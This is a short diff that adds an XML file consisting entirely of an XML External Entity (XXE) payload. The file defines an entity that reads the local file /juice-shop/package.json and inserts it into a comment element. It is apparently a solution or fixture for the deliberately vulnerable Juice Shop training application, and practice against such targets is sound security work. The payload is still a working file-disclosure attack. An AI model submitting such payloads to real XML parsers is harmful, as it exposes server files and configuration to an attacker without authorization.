@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "/juice-shop/package.json">
+]>
+<comment><text>&xxe;</text></comment>
